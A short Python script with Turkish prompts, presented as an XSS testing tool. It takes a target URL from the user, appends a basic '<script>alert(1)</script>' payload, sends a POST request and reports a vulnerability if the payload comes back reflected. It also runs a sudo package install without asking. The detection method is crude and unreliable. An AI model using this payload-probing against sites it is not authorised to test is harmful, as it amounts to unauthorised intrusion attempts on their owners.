import os 
import requests
import time

os.system("clear")
print("#################################")
print("            HOŞGELDİN!           ")
print("         İyi Kulanımlar.         ")
print("#################################")
time.sleep(3)
os.system("clear")

os.system("sudo apt-get install figlet")

print("#########################")
os.system("figlet xbozk0rt")
print("Hedef Site XSS Test Aracı")
print("#########################")
payload = '<script>alert(1)</script>'
print("1. TEST")
url = input("Hedef Site : ")
req = requests.post(url + payload)
if payload in req.text:
 print("XSS Açığı bulundu")
 print('Payload : <script>alert(1)</script>')

else: 
 print("Payload Geçersiz")

